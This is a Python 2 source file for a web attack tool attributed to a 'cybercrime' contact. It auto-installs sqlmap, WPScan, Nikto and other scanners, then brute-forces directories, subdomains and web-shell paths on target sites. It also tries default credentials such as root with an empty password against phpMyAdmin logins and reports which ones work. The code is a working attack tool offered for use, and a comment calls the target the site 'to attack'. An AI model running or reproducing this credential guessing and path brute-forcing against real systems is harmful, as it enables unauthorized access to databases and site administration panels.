#!/usr/bin/env python
# -*- coding: UTF-8 -*-

#Author: Dmitry Radchenko. cybercrime@null.net
#Telegram: @cybercrime

#Description: The tool for fast and simple web vulnerabilities checks.

from threading import Thread, Lock, currentThread, activeCount, BoundedSemaphore
from random import choice
import resource
import Queue
import time
import subprocess
import platform
import readline
import signal
import os
import re
import sys
import locale

class bcolors:
	BlackOnIndigo = '\x1b[2;30;46m'
	BlackOnYellow = '\x1b[2;30;43m'
	BlackOnBlue = '\x1b[2;30;44m'
	BlackOnWhite = '\033[2;30;47m'
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	OKCYAN = '\033[36m'
	RED = '\033[91m'
	WARNING = '\033[93m'
	Yellow='\033[33m'
	LightCyan='\033[96m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'


try:
	subprocess.check_output("git --version", shell=True)
except:
	print bcolors.OKGREEN+"git isn't installed. Installing..."+bcolors.ENDC
	subprocess.check_call("sudo apt-get install git", shell=True)
try:
	subprocess.check_output("pip -V", shell=True)
except:
	print bcolors.OKGREEN+"pip isn't installed. Installing..."+bcolors.ENDC
	subprocess.check_call("sudo apt-get install python-pip", shell=True)
try:
	subprocess.check_output("nmap -V", shell=True)
except:
	print bcolors.OKGREEN+"nmap isn't installed. Installing..."+bcolors.ENDC
	subprocess.check_call("sudo apt-get install nmap", shell=True)
try:
	import requests
except:
	print bcolors.OKGREEN+"Python-Requests isn't installed. Installing..."+bcolors.ENDC
	subprocess.check_call("sudo pip install requests", shell=True)
	import requests
try:
	import httplib2
except:
	print bcolors.OKGREEN+"Python-httplib2 isn't installed. Installing..."+bcolors.ENDC
	subprocess.check_call("sudo pip install httplib2", shell=True)
	import httplib2
try:
	import xmltodict
except:
	print bcolors.OKGREEN+"Python-xmltodict isn't installed. Installing..."+bcolors.ENDC
	subprocess.check_call("sudo pip install xmltodict", shell=True)
	import xmltodict
try:
	import wget
except:
	print bcolors.OKGREEN+"Python-wget isn't installed. Installing..."+bcolors.ENDC
	subprocess.check_call("sudo pip install setuptools", shell=True)
	subprocess.check_call("sudo pip install wget", shell=True)
	import wget


     
scriptdir = os.path.dirname(os.path.realpath(__file__))
searchNum = 0
searchLineDone = 0
fileLength = 0
fileLengthThis = 0
subDomainsList = []
dorksList = []
lock = Lock()

vulnerableURLs = 0
pagesTested = 0

strictOutput = 0
noErrors = 0
specialError = 0

#Determining OS platform
OsVer = platform.dist()

#Check SQLMap installation
if not os.path.isfile(scriptdir+"/sqlmap/sqlmap.py"):
	print bcolors.OKGREEN+"Installing SqlMap..."+bcolors.ENDC
	subprocess.check_call("git clone https://github.com/sqlmapproject/sqlmap.git "+scriptdir+"/sqlmap", shell=True)
else:
	print bcolors.OKGREEN+"Updating SqlMap..."+bcolors.ENDC
	subprocess.check_output(scriptdir+"/sqlmap/sqlmap.py --update", shell=True)

#Check WPScan installation
if not os.path.isfile(scriptdir+"/wpscan/wpscan.rb"):
	print bcolors.OKGREEN+"Installing WPScan..."+bcolors.ENDC
	subprocess.check_call("git clone https://github.com/wpscanteam/wpscan.git "+scriptdir+"/wpscan", shell=True)
	if "Mint" in OsVer[0] or "Ubuntu" in OsVer[0]:
		subprocess.check_call("sudo apt-get install libcurl4-openssl-dev libxml2 libxml2-dev libxslt1-dev ruby-dev build-essential libgmp-dev zlib1g-dev", shell=True)
	if "Debian" in OsVer[0] or "Kali" in OsVer[0]:
		subprocess.check_call("sudo apt-get install gcc git ruby ruby-dev libcurl4-openssl-dev make zlib1g-dev", shell=True)
	subprocess.check_call("cd "+scriptdir+"/wpscan && sudo gem install bundler && bundle install --without test && cd "+scriptdir, shell=True)

#Check Nikto installation
if not os.path.isfile(scriptdir+"/nikto/program/nikto.pl"):
	print bcolors.OKGREEN+"Installing Nikto..."+bcolors.ENDC
	subprocess.check_call("git clone https://github.com/sullo/nikto.git "+scriptdir+"/nikto", shell=True)

#Check Patator installation
if not os.path.isfile(scriptdir+"/patator/patator.py"):
	print bcolors.OKGREEN+"Installing Patator..."+bcolors.ENDC
	subprocess.check_call("git clone https://github.com/lanjelot/patator.git "+scriptdir+"/patator", shell=True)

#Check w3af installation
if not os.path.isfile(scriptdir+"/w3af/w3af_gui"):
	print bcolors.OKGREEN+"Installing w3af..."+bcolors.ENDC
	subprocess.check_call("git clone https://github.com/andresriancho/w3af.git "+scriptdir+"/w3af", shell=True)
	subprocess.check_call("sudo pip install -U setuptools && sudo apt install graphviz libpython-dev python-dev libxml2-dev libxslt-dev libssl-dev", shell=True)
	if os.path.isfile("/tmp/w3af_dependency_install.sh"):
		subprocess.check_call("sh /tmp/w3af_dependency_install.sh", shell=True)
	subprocess.check_call("sudo pip install requests", shell=True)

#Check OWASP ZAP installation
def installZap():
	import tarfile
	print bcolors.OKGREEN+"Installing OWASP ZAP..."+bcolors.ENDC
	zapURL = xmlParsed['ZAP']['core']['linux']['url']
	wget.download(zapURL, out=scriptdir+'/ZAP.tar.gz')
	zapExtract = tarfile.open(scriptdir+'/ZAP.tar.gz', 'r:gz')
	zapExtract.extractall(path=scriptdir)
	zapExtract.close()
	os.rename(scriptdir+'/ZAP_'+zapVersion, scriptdir+'/ZAP')
	os.remove(scriptdir+'/ZAP.tar.gz')
	with open(scriptdir+'/ZAP/zap.ver', 'w') as versionFile:
		versionFile.write(zapVersion)

xmlToParse = requests.get("https://raw.githubusercontent.com/zaproxy/zap-admin/master/ZapVersions.xml")
xmlParsed = xmltodict.parse(xmlToParse.content)
zapVersion = xmlParsed['ZAP']['core']['version']
if not os.path.isfile(scriptdir+"/ZAP/zap.sh"):
	installZap()
if os.path.isfile(scriptdir+"/ZAP/zap.ver"):
	with open(scriptdir+'/ZAP/zap.ver', 'r') as verFile:
		versionZap = verFile.read()
		if str(zapVersion.strip()) != str(versionZap.strip()):
			print bcolors.BlackOnWhite+"There is a NEW version of OWASP ZAP, do you want to update it (it will delete previous version)?(Y/N*)"+bcolors.ENDC
			updateZap = raw_input() or "N"
			if updateZap is "Y" or updateZap is "y":
				import shutil
				shutil.rmtree(scriptdir+"/ZAP")
				installZap()

	
def Space(j):
	i = 0
	while i<=j:
		print " ",
		i+=1


# Print iterations progress
def printProgress (iteration, total, prefix = '', suffix = '', decimals = 1, barLength = 100):
	"""
	Call in a loop to create terminal progress bar
	@params:
		iteration   - Required  : current iteration (Int)
		total       - Required  : total iterations (Int)
		prefix      - Optional  : prefix string (Str)
		suffix      - Optional  : suffix string (Str)
		decimals    - Optional  : positive number of decimals in percent complete (Int)
		barLength   - Optional  : character length of bar (Int)
	"""
	formatStr       = "{0:." + str(decimals) + "f}"
	percents        = formatStr.format(100 * (iteration / float(total)))
	filledLength    = int(round(barLength * iteration / float(total)))
	#bar             = '█' * filledLength + '-' * (barLength - filledLength)
				# Для полосы загрузки вставить | %s | вместо вертикально черты в "\r%s | %s%s" в строке ниже. И раскомментировать строку выше.
				# и вставить bcolors.Yellow + bar + bcolors.ENDC, между "prefix, percents," в строке ниже.
	sys.stdout.write('\r%s | %s%s %s %s' % (bcolors.BlackOnWhite + prefix, percents, '%', suffix + bcolors.ENDC, "\r")),
	sys.stdout.flush()
	#if iteration == total:
		#sys.stdout.write("Done, wait closing threads...\r")
		#sys.stdout.write("\033[K") # Чтобы оставить прогресс-бар после окончания нужно заменить текст в скобках на этот "\n"
		#sys.stdout.flush()

#######################################################################
######################Site dirs scan / start###########################
#######################################################################


#maximum Open File Limit
maxOpenFileLimit = resource.getrlimit(resource.RLIMIT_NOFILE)[0]
# Создаем ограничение по максимальному числу потоков основанное на лимите системы для Open Files
threadLimiter = BoundedSemaphore(maxOpenFileLimit-300)

# Не показывать предупреждения SSL соединения.
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Проверка URL на существование. Если страница существует - возвращает "Exists", если не существует - "Nothing".
def checkUrl(url, pma=0):
	global threadLimiter
	global specialError
	
	# Чтобы не было ошибок при подключении к домену, будем использовать сессию для каждого запроса.
	requestSessions = requests.Session()
	adapter = requests.adapters.HTTPAdapter(max_retries=10) # Делаем до 10 повторных запросов при ошибке сокета.
	requestSessions.mount('http://', adapter)
	requestSessions.mount('https://', adapter)

	headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"}
	try:
		# Приостанавливаем все потоки на этом участке кода, если потоков больше чем указано в threadLimiter.
		threadLimiter.acquire()
		resp = requestSessions.get(url, timeout=60, verify=False, headers=headers)
		requestSessions.close() # Закрываем сессию.
		threadLimiter.release() # Снимаем блокирование для следующего потока.
		if (specialError != 0): # Дополнительно проверяем текст на странице, если указан текст/код при ошибке.
			if specialError.startswith("!reverse!"): # Обратное действие специального кода ошибки. Если вначале кода ошибки указано "!reverse!",
				specialError = specialError[9:] # убираем это слово (первые 9 символов строки),
				if (unicode(codePart) not in resp.text): # если код открытой страницы не содержит этого кода,
					return "Nothing" # возвращаем ответ страница не найдена.
			else: # Иначе воспринимаем код/текст ошибки как индикатор ошибки.
				specialError = specialError.split("!or&or!") # Разбиваем код на отдельные части если указаны несколько вариантов кода.
				for codePart in specialError: # Для каждого варианта кода проверяем
					if (unicode(codePart) in resp.text):
						return "Nothing" # Если код страницы совпадает с текстом/кодом ошибки, который указан заранее, то возвращаем "пусто".
		if (resp.status_code < 400): # Если код страницы меньше 400, значит страница существует
			# Если проверяем phpMyAdmin, дополнительно проверяем явные пизнаки PhpMyAdmin.
			if (pma == 1):
				return phpMyAdminStrictCheck(url, resp)
			else:
				return "Exists"
		else: # Если код страницы больше 400, значит страницы не существует.
			return "Nothing"
	except requests.exceptions.Timeout: # Если сработал таймаут, возвращаем ошибку таймаута.
		return "!Connection timed out"
	except Exception as e:
		# Любуюу другую ошибку запроса возвращаем со знаком ! в начале, 
		# чтобы при проверке в коде далее распознавать ответ как ошибку.
		return "!"+str(e)

# Проверка присутствия phpMyAdmin по явным признакам.
def phpMyAdminStrictCheck(url, resp):
	# Ищем код из шаблона PhpMyAdmin в загруженной странице.
	if(u' id="imLogo" name="imLogo" alt="phpMyAdmin" border="0" /></a>' in resp.text) \
	or (u' title="Databases" alt="Databases" class="icon ic_s_db">&nbsp;Databases</a>' in resp.text) \
	or (u'<a href="server_databases.php' in resp.text) \
	or (u'alt="phpMyAdmin" id="imgpmalogo">' in resp.text) \
	or (u'title="Open new phpMyAdmin window"' in resp.text) \
	or (u'<p>phpMyAdmin is more friendly with a <b>frames-capable</b> browser.</p>' in resp.text):
		# Проверяем отсутствие пароля и пару стандартных паролей. 
		phpMyAdminLogins = phpMyAdminROOTLogin(url)
		if(phpMyAdminLogins.startswith("EASYPASS=")):
			return phpMyAdminLogins
		# Проверяем есть ли уязвимые страницы.
		if(checkUrl(url+"error.php?type=Error070890") is "Exists"):
			if(checkUrl(url+"scripts/setup.php") is "Exists"):
				return "AndSetupFile!"
			else:
				return "TextInjection!"
		else:
			return "Exists!"
	else:
		return "Exists"

# Пробуем стандартные пароли.
def phpMyAdminROOTLogin(url):
	# Чтобы не было ошибок при подключении к домену, будем использовать сессию для каждого запроса.
	requestSessions = requests.Session()
	adapter = requests.adapters.HTTPAdapter(max_retries=10) # Делаем до 10 повторных запросов при ошибке сокета.
	requestSessions.mount('http://', adapter)
	requestSessions.mount('https://', adapter)

	headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"}
	logins = ["root:", "root:password", "pma:pmapass", "pmausr:pmapass"]

	for log in logins:
		login = log.split(":")
		payload = {'pma_username':login[0], 'pma_password':login[1]}
		try:
			threadLimiter.acquire()
			resp = requestSessions.post(url, data=payload, timeout=60, verify=False, stream=False, headers=headers)
			requestSessions.close() # Закрываем сессию.
			threadLimiter.release()
			if (u'name="pma_username"' not in resp.text):
				return "EASYPASS="+login[0]+":"+login[1]
		except Exception as e:
			return "!phpMyAdminROOTLogin "+str(e)
	return "No"

def falsePosChecked(url):

	# Чтобы проверить ответ сервера, будем загружать заведомо не существующую ссылку.
	link = "/nonExistingUrlCheck070890"

	checks = checkUrl(url+link)
	if checks is "Nothing": # Если сервер ответил, что страницы не существует,
			return "original" # Возвращаем слово "original".
	elif checks.startswith("!"): # Если была ошибка при проверке, то в начале будет знак !, возвращаем ошибку.
		return checks
	else: 
		# Если страница помечена как "Exists", скорее всего это False Positive. 
		# Пробуем еще раз с учетом редиректа, если он есть.
		additionalCheck = additionalFalsePositiveCheck(url)
		if additionalCheck is "falsePositive":
			return "!False Positives" # Если сервер ответил что ссылка существует, значит возвращаем слово "!false Positive", сервер будет давать фальшивые ответы.
		else:
			return additionalCheck # Иначе возвращаем новую ссылку из редиректа.

def additionalFalsePositiveCheck(url):
	# Чтобы не было ошибок при подключении к домену, будем использовать сессию для каждого запроса.
	requestSessions = requests.Session()
	adapter = requests.adapters.HTTPAdapter(max_retries=10) # Делаем до 10 повторных запросов при ошибке сокета.
	requestSessions.mount('http://', adapter)
	requestSessions.mount('https://', adapter)

	try:
		# Делаем пробный запрос проверяя есть ли редирект.
		resp = requestSessions.get(url, verify=False, headers={"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"})
		requestSessions.close() # Закрываем сессию.
	except Exception as e:
		return "!"+str(e)
	if resp.history:
		 # Если редирект был, и фальшивая страница по новой ссылке не найдена, 
		 # значит возвращаем новый домен из редиректа.
		if checkUrl(resp.url+"/nonExistingUrlCheck070890") is "Nothing":
			return resp.url
		else: # Если страница помечена как существующая даже по новому домену, возвращаем "falsePositive".
			return "falsePositive"
	else: 
		# Если редиректа не было(а эта функция запускается только если фальшивая страница найдена), 
		# значит сайт будет выдавать ложные срабатывания.
		return "falsePositive"

def findSiteDirs():
	# Ввести URL сайта для атаки
	print bcolors.HEADER + "Enter URL of a website \n" \
										"(For example : http://example.com, " \
										"or path to a file with links /path/urls.txt): \n" \
										"(Add sign ! at the begining, to show the server response)" + bcolors.ENDC
	link = raw_input()
	checkMenu(link)
	if link.startswith("!"):
		link = link[1:]
		checkResponse(link)
	linkToList = []
	# Чистим путь к файлу, на случай если файл был перетащен в окно терминала.
	link = link.strip()
	if link.endswith("'"): link = link[:-1]
	if link.startswith("'"): link = link[1:]
	# Если вместо ссылки вписан файл, считываем каждую строку, убираем всё лишнее(пробелы, подчеркивания...) и добавляем в массив.
	if link.startswith("/"):
		with open(link, "r") as lnks:
			for lnksLine in lnks:
				linkToList.append(lnksLine.rstrip())
	else: # Если вписан URL то просто добавляем его в массив.
	# Превращаем ссылку в массив с одной позицией чтобы использовать её в цикле многопоточной функции.
		linkToList.append(link)

	# Для каждой строки в массиве делаем проверки на определенные знаки.
	for idx,linkToListLine in enumerate(linkToList):
		if linkToListLine.endswith('/'): # Если URL заканчивается на "/", то убираем этот знак.
			linkToListLine = linkToListLine.rstrip('\/') 
		if not linkToListLine.startswith('http'): # Если URL начинается без "http", то вставляем его туда.
			linkToListLine = "http://" + linkToListLine
		linkToList[idx] = linkToListLine
	findSiteDirsNext(linkToList)

def askDictionary():
	# Выбрать словарь для перебора URL.
	dictionary = raw_input(bcolors.HEADER + _("\n Which dictionary to use? \n") + bcolors.ENDC + 
												_(" 1.* Only PhpMyAdmin (!1 to use short one).\n"
												" 2. All links.\n"
												" 3. Extended.\n"
												" 4. ASP/ASPX.\n"
												" 5. Web-shells.\n"
												" 6. Subdomains.\n"
												" 7. All links (w/o subdomains).\n"
												" 8. Own dictionary.\n"
												"\n")) or "1"
	# В зависимости от введенной цифры выбрать определенный словарь.
	if (dictionary is '1'):
		dictionaryFile = scriptdir + "/links-and-dirs/phpmyadmin.txt"
		dictKeyword = "PhpMyAdmin Full"
	elif (dictionary == '!1'):
		dictionaryFile = scriptdir + "/links-and-dirs/myadmin.txt"
		dictKeyword = "PhpMyAdmin Little"
		dictionary = "1"
	elif (dictionary == '1!'):
		dictionaryFile = scriptdir + "/links-and-dirs/adminmy.txt"
		dictKeyword = "PhpMyAdmin Little, Continuation"
		dictionary = "1"
	elif (dictionary is '2'):
		dictionaryFile = scriptdir + "/links-and-dirs/admindic.txt"
		dictKeyword = "all dirs"
	elif (dictionary is '3'):
		dictionaryFile = scriptdir + "/links-and-dirs/admindic2.txt"
		dictKeyword = "all dirs extended"
	elif (dictionary is '4'):
		dictionaryFile = scriptdir + "/links-and-dirs/admindicASPX.txt"
		dictKeyword = "ASP/ASPX"
	elif (dictionary is '5'):
		dictionaryFile = scriptdir + "/links-and-dirs/shells.txt"
		dictKeyword = "Web Shells"
	elif (dictionary is '6'):
		dictionaryFile = scriptdir + "/links-and-dirs/subdomains.txt"
		dictKeyword = "subdomains"
	elif (dictionary is '7'):
		dictionaryFile = scriptdir + "/links-and-dirs/admindicALL.txt"
		dictKeyword = "Everything (w/o subdomains)"
	elif (dictionary is '8'):
		print bcolors.HEADER + "Enter path to the dictionary. For Example: /home/venimus/dictionary.txt" + bcolors.ENDC
		dictionaryFile = raw_input()
		dictionaryFile = dictionaryFile.strip()
		if dictionaryFile.endswith("'"): dictionaryFile = dictionaryFile[:-1]
		if dictionaryFile.startswith("'"): dictionaryFile = dictionaryFile[1:]
		dictKeyword = "Own dictionary"
	checkMenu(dictionary)

	return dictionary, dictionaryFile, dictKeyword

def askThreads(dictionary):
	global strictOutput
	global noErrors
	# Если ищем phpMyAdmin, то предлагаем выводить результаты только при явных признаках.
	# Вписав восклицательный знак перед цифрой количества потоков.
	if (dictionary is "1") and (strictOutput == 0):
		additionalHint = "Type sign ! with thread count(at any place), \nto show results only in case of obvious evidences.\nAdditionally, sign # means hide errors.\n"
	else:
		additionalHint = "Type sign # with thread count(at any place), \nto hide errors.\n"
	print additionalHint + bcolors.HEADER + "How many threads for a website? (20*): " + bcolors.ENDC
	threadsCount = raw_input() or "20"
	checkMenu(threadsCount)
	if "!" in threadsCount: # Если в ответе присутствует знак !,
		strictOutput = 1 # Включаем флаг вывода результатов только при явных признаках PhpMyAdmmin.
		if threadsCount == "!": # Если вписан только !
			threadsCount = 20 # то заменяем знак на число по умолчанию.
		else:
			threadsCount = threadsCount.replace("!", "") # Иначе убираем символ ! из ответа.
	if "#" in threadsCount: # Если в ответе присутствует знак #,
		noErrors = 1 # Включаем флаг не выводить ошибки.
		if threadsCount == "#": # Если вписан только #
			threadsCount = 20 # то заменяем знак на число по умолчанию.
		else:
			threadsCount = threadsCount.replace("#", "") # Иначе убираем символ ! из ответа.
	threadsCount = str(threadsCount).strip()

	return int(threadsCount)

def findSiteDirsNext(originalLinks):
	global fileLength
	global fileLengthThis
	global maxOpenFileLimit
	global strictOutput
	global noErrors
	global specialError
	link = originalLinks

	# Спрашиваем пользователя какой словарь использовать и помещаем результат в переменные.
	dictionary, dictionaryFile, dictKeyword = askDictionary()

	# Если брутим субдомены то убираем www и ставим http на место, если он есть.
	if (dictionary is "6") and ("www." in link):
		for linkUrl in link:
			linkUrl = linkUrl.replace("http://", "").replace("https://", "")
			linkUrl = re.sub(r"^www\.", "", linkUrl)
	
	# Спрашиваем каким методом определять существующие страницы.
	# Если уже ранее был вписан какой либо текст/код идентифицирующий страницу ошибки, значит не спрашиваем и используем этот текст.
	# Спрашиваем текст/код страницы с ошибкой, только если specialError имеет изначальное значение 0(использовать ответ сервера).
	if specialError == 0:
		askErrorText()

	# Если сайтов больше 50, то предлагаем выводить результаты только явных признаках, использовать сокращенный словарь и не выводить ошибки. 
	if (len(link) > 50) and (dictionary == "1"):
		print "There are more than 50-ти websites in list. \n"
		asqDictionary = raw_input(bcolors.HEADER + "Use short dictionary?"
													" [Y*/n]"+ bcolors.ENDC) or "Y"
		if (asqDictionary is "Y") or (asqDictionary is "y"):
			dictionaryFile = scriptdir + "/links-and-dirs/myadmin.txt"
			dictKeyword = "PhpMyAdmin Little"
		asqOutput = raw_input(bcolors.HEADER + "Show results only in case of obvious evidences?"
						" [Y*/n]"+ bcolors.ENDC) or "Y"
		if (asqOutput is "Y") or (asqOutput is "y"):
			# Меняем глобальную переменную, 
			# которая означает не выводить результаты если нет явных признаков phpMyAdmin.
			strictOutput = 1

		askHideErrors()

	# Сколько потоков одновременно.
	threadsCount = askThreads(dictionary)

	####################################
	if ((threadsCount*len(link)) > (maxOpenFileLimit-300)):
		print str((maxOpenFileLimit-300)/threadsCount)+" sites simultaneously in " + str(threadsCount) + \
						" threads per each, \nwill be scanned because of Open Files (ulimit -n) limit."
	print "\n----- Starting " + dictKeyword + " Search -----\n"

	# Высчитываем количество строк в файле выбранного словаря.
	fileLengthThis = sum(1 for line in open(dictionaryFile, "r"))
	fileLength += fileLengthThis # Добавляем число в общую глобальную переменную
	# После того, как мы пересчитывали строки в фале, курсор перешел вниз. Здесь мы сбрасываем курсор обратно на первую строку.
	#dictionaryFile.seek(0)

	domainsScan(link, threadsCount, dictionary, dictionaryFile)

	searchingDone()

	if dictionary is "6" and subDomainsList:
		nextSubdomains = raw_input("Scanning ended. Do you want to scan each subdomain? (Y/n)") or "Y"
		if (nextSubdomains is "Y") or (nextSubdomains is "y"):
			threadsCount = askThreads()
			dictionary, dictionaryFile, keyword = askDictionary()

			print "\n----- Starting " + dictKeyword + " Search -----\n"
			domainsScan(subDomainsList, threadsCount, dictionary, dictionaryFile)
			searchingDone()
			doneNext()
		else:
			doneNext()
	else:
		print "Scanning ended, do you want to repeat? (q - to main menu)"
		findSiteDirsNext(originalLinks)

def askHideErrors():
	global noErrors
	print bcolors.HEADER + "Hide errors? [Y*/n]"+ bcolors.ENDC
	asqErrors = raw_input() or "Y"
	if (asqErrors is "Y") or (asqErrors is "y"):
		noErrors = 1

def askErrorText():
	global specialError
	print bcolors.HEADER + "Enter code/text of a page to determine not existent page\n(by obvious signs).\n!reverse! at the begining, to make it otherwise, search for pages without the code/text.\n!or&or! to separate few wariants of code(without whitespaces). \n[Enter - use server response]" + bcolors.ENDC
	specialError = raw_input() or 0

def domainsScan(domainsList, threadsCount, dictionary, dictionaryFile):
	global fileLength
	global fileLengthThis
	global maxOpenFileLimit
	global searchLineDone
	global specialError
	falsePosCheck = "original"

	fileLength = fileLength * len(domainsList)

	domainThreads = []

	# Если сканируем много адресов, сохраняем результаты в файл.
	if dictionary is "7":
		# Создаем файл сессии с именем текущей датой и временем.
		saveSessionFile = open(scriptdir+"/scansResults/"+time.strftime("%Y-%m-%d--%H-%M-%S")+".txt", "w")
	else:
		saveSessionFile = "0"

	currentCheck = 0 # Текущая проверка False Positives.

	# Копируем все строки из файла словаря в список.
	openDictionaryFile = open(dictionaryFile, "r")
	linesOfDictionary = openDictionaryFile.readlines()
	openDictionaryFile.close()
	# Для каждой ссылки делаем следующее.
	for domainToScan in domainsList:
		addThisDomain = "1" # Флаг добавления домена/ссылки
		currentCheck = currentCheck + 1 # Количество уже проверенных сайтов на False Positives.
		sys.stdout.write("Checking for false-positives and redirects... ("
							+str(currentCheck)+"/"+str(len(domainsList))+")\r")
		sys.stdout.flush()
		# Проверяем, будет ли URL выдавать фальшивые ссылки(False Positives) или ошибки, 
		# если словарь не для субдоменов(6) или проверка по явным признакам не включена, или не указан код/текст при ошибке.
		if (dictionary is not "6") and (strictOutput != 1) and (specialError == 0):
			falsePosCheck = falsePosChecked(domainToScan)
			# Если функция проверки False Positives вернула ответ со знаком ! в начале,
			# значит произошла ошибка при проверке.
			if (falsePosCheck.startswith("!")):
				printErrorsCheck(falsePosCheck, domainToScan) # Выводим ошибку.
				print "Use text from the page with error instead of server response."
				addThisDomain = "0" # Не добавляем домен/ссылку в список проверки поменяв флаг добавления.
				# Если сканируется всего одна ссылка, то выходим при срабатывании False-Positive проверки.
				if len(domainsList) < 2:
					doneNext()
			# Если при проверке был редирект, заменяем ссылку на новую из редиректа.
			elif(falsePosCheck is not "original"):
				print bcolors.LightCyan + domainToScan + " >> redirects to >> " + falsePosCheck + bcolors.ENDC
				sys.stdout.write("Checking for false-positives and redirects...\r")
				sys.stdout.flush()
				domainToScan = falsePosCheck

		# Если флаг добавления == "1", значит добавляем домен/ссылку в задание для мультипоточности.
		if(addThisDomain is "1"):

			dictionaryFileQueue = Queue.Queue() # Создаем очередь. Она всегда считывает только каждый последующий элемент из списка.

			# Копируем список в очередь. 
			# Чтобы каждый поток считывал только последующую строку из списка.
			for url in linesOfDictionary:
				dictionaryFileQueue.put(url.strip())
			# Добавляем ключевое слово, обозначающе конец списка.
			dictionaryFileQueue.put("lastLineDone")
		
			# Создаем задание для мультипоточности. 
			for i in range(threadsCount):
				# Создаем список из домена/ссылки в threadsCount потоков с заданием Thread.
				domainThreads.append(Thread(target=domains_Scan_Start, args=(dictionaryFileQueue, dictionary, domainToScan, saveSessionFile)))
	
	# Запускаем потоки из списка.
	for thread in domainThreads:
		while True:
			if(int(activeCount()) < (maxOpenFileLimit-300)):
				thread.start()
				break
			else:
				time.sleep(.1)
				continue

	# Ждем пока каждый поток завершится.
	for thread in domainThreads:
		thread.join()

	domainThreads = [] # Обнуляем список заданий для мультипоточности.
	if dictionary is "7":
		saveSessionFile.close()

def printErrorsCheck(whatError, domainLink):
	global fileLength
	global fileLengthThis

	sys.stdout.write("\033[K")
	print bcolors.RED + domainLink + " >> " + whatError + bcolors.ENDC
	sys.stdout.write("Checking for false-positives and redirects...\r")
	sys.stdout.flush()
	fileLength = fileLength - fileLengthThis

# Функция, которая будет искать директории в несколько потоков.
def domains_Scan_Start(dictionaryFileQueue, dictionary, link, saveSession="0"):
	global searchNum
	global fileLength
	global subDomainsList
	global lock
	global strictOutput
	global searchLineDone
	global noErrors
	# Бесконечный цикл. Прерываем его только когда дошли до последней строки в файле.
	while not dictionaryFileQueue.empty():
		# Считываем строку из Queue и переводим курсор в очереди на строку ниже.
		sub_link = dictionaryFileQueue.get()
		# Если взяли последнюю ссылку для домена, значит увеличиваем число готовых доменов.
		if sub_link is "lastLineDone":
			searchLineDone += 1
		else:
			# Если словарь для субдоменов, то убираем всё лишнее из ссылки.
			if (dictionary == '6'):
				link = link.replace("http://", "").replace("https://", "") # Убираем http и https если брутим субдомены.
				link = re.sub(r"\/(.*)", "", link) # Убираем директории из ссылки, если они есть.
				req_link = "http://"+sub_link.rstrip('\n')+"."+link # Формируем ссылку обратно уже с субдоменом внутри.
			else:
				req_link = link+"/"+sub_link.rstrip('\n') # !!! Убираем символ перехода на новую строку в конце каждой ссылки (в файле словаря они все с символом "\n" на конце).

			# Делаем запрос через функцию checkUrl.
			if (dictionary is "1"): # Если словарь для PhpMyAdmin, то добавляем дополнительную проверку на присутсвие PhpMyAdmin.
				responsed = checkUrl(req_link, pma=1)
			else:
				responsed = checkUrl(req_link, pma=0)
			# Если ответ функции checkUrl не равен "Nothing", значит страница есть. 
			# Пишем в терминал URL успешной проверки.
			if (responsed != "Nothing"):
				lock.acquire() # Приостанавливаем доступ к терминалу для других потоков, чтобы текст не смешивался.
				sys.stdout.write("\033[K") # Стереть строку до конца.
				if responsed.startswith("!"):  # Если ответ начинается со знака !, значит была ошибка во время запроса.
					if (dictionary is "6") and ("[Errno -2] Name or service not known" in responsed): # Если словарь для субдоменов и ошибка домена
						pass # Не делать ничего.
					elif (dictionary is "6") and ("[Errno -5] No address associated with hostname" in responsed): # То же для похожей ошибки.
						pass
					else: # Во всех других случаях
						if (noErrors == 0): # Если включен флаг вывода ошибок
							print req_link + " >> " + responsed # Выводим ошибку.
				elif (dictionary is "1") and (responsed == "Exists!"):
					# Если словарь == "1" и ответ проверки ссылки == "Exists!", значит это явно phpMyAdmin.
					# Выводим ссылку закрашивая фон синим цветом.
					sys.stdout.write(bcolors.BlackOnBlue+"PMA => "+req_link+" << PMA\n"+bcolors.ENDC)
				elif (dictionary is "1") and (responsed == "TextInjection!"):
					# Если словарь == "1" и ответ проверки ссылки == "XSSVulnerable!", значит это явно phpMyAdmin,
					# с уязвимостью к XSS инъекции. Выводим ссылку закрашивая фон бирюзовым цветом.
					sys.stdout.write(bcolors.BlackOnIndigo+"Text Injection => "+req_link+"/error.php?error=Your Text Here"+" << PMA\n"+bcolors.ENDC)
				elif (dictionary is "1") and (responsed == "AndSetupFile!"):
					# Если словарь == "1" и ответ проверки ссылки == "XSSVulnerable!", значит это явно phpMyAdmin,
					# с уязвимостью к XSS инъекции. Выводим ссылку закрашивая фон бирюзовым цветом.
					sys.stdout.write(bcolors.BlackOnIndigo+"Text Injection => "+req_link+"/error.php?error=Your Text Here"+"\n")
					sys.stdout.write("Setup File => "+req_link+"/scripts/setup.php"+"\n"+bcolors.ENDC)
				elif (dictionary is "1") and (responsed.startswith("EASYPASS=")):
					# Если словарь == "1" и ответ проверки ссылки == "EASYPASS!", значит это явно phpMyAdmin,
					# со стандартным паролем или без него. Выводим ссылку закрашивая фон желтым цветом.
					lognPassw = responsed.split("=")[1]
					sys.stdout.write(bcolors.BlackOnYellow+"PASSWORD ("+lognPassw+") => "+req_link+"\n"+bcolors.ENDC)
				elif (strictOutput == 0):
					# Если глобальная переменная strictOutput(флаг для вывода только при явных признаках) == 0,
					# значит просто выводим ссылку зеленым цветом.
					sys.stdout.write(bcolors.OKGREEN+"OK => "+req_link+"\n"+bcolors.ENDC)
				lock.release() # Возобновляем доступ к терминалу для других потоков.
				sys.stdout.flush() # sys.stdout.write пишет сначала в память. Эта команда выводит текст из памяти в терминал.
				if dictionary is "6":
					# Если искали субдомены, добавляем найденный субдомен в список для последующей проверки каждого.
					subDomainsList.append(req_link)
				if dictionary is "7":
					# Если искали все ссылки сразу большим словарем, записываем найденные ссылки в файл.
					lock.acquire()
					saveSession.write(req_link + "\n")
					saveSession.flush() # .write() пишет сначала в память, а .flush() переносит из памяти в файл.
					lock.release()

